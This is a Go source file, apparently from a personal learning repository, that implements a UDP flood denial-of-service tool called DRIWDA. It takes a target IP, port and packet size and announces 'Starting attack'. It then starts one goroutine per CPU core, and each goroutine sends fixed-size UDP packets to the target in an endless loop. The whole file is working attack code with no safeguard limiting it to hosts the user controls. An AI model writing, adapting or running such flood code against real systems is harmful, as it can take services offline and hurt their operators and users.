// ===== DRIWDA UDP FLOOD TOOL EXPERIMENT =====
// Author: ZeltNamizake (Driyas)
// Repository: LearnGO
// Note: Personal networking experiment using goroutines

package main

import(
  "fmt"
  "os"
  "net"
  "runtime"
  "strconv"
  )
  
func banner() {
	fmt.Println(`
██████╗ ██████╗ ██╗██╗    ██╗██████╗  █████╗
██╔══██╗██╔══██╗██║██║    ██║██╔══██╗██╔══██╗
██║  ██║██████╔╝██║██║ █╗ ██║██║  ██║███████║
██║  ██║██╔══██╗██║██║███╗██║██║  ██║██╔══██║
██████╔╝██║  ██║██║╚███╔███╔╝██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝ ╚══╝╚══╝ ╚═════╝ ╚═╝  ╚═╝`)
}
func main () {
  //---- ARGUMENT PARSINGS -----
  if len(os.Args) < 2 || len(os.Args) > 4{
    banner()
    fmt.Println(`Usage: go run driwda.go <target_ip>
TARGET SPECIFICATION:
  Can pass IP addresses, port, packetSize
  Ex: go run driwda.go <ip> <port?> <packetSize?>
DEFAULT TARGET:
  - <port> 80 | target Port
  - <packetSize> 1024 | packet size byte/s
`)
    return
  }
  
  targetIp := os.Args[1]; targetPort := "80"
  packetSize := 1024
  
  if len(os.Args) >= 3 {
    targetPort = os.Args[2]
  }
  
  if len(os.Args) >= 4 {
    packet, err := strconv.Atoi(os.Args[3])
    if err != nil {fmt.Println("Error:", err); return}
    if packet <= 0 {
    fmt.Println("Packet size must be > 0")
    return
   }
    packetSize = packet
  }
  
  numWorkers := runtime.NumCPU()
  targetAddr := net.JoinHostPort(targetIp, targetPort)
  banner()
  fmt.Print("Starting attack to ", targetAddr, " with workers ", numWorkers, " core...")
  
  //------ PAYLOAD GENERATION--------
  payload := make([]byte, packetSize)
	for i := range payload {
		payload[i] = 'X'
	}
  
  //------- WORKER SPAWNER --------
  for i := 0; i < numWorkers; i++ {
		go func(id int) {
			conn, err := net.Dial("udp", targetAddr)
			if err != nil {
				fmt.Printf("Worker %d Error: %v\n", id, err)
				return
			}
			defer conn.Close()

			for {
				_, err := conn.Write(payload)
				if err != nil {
					continue
				}
			}
		}(i)
	}
	
	select {}
  
}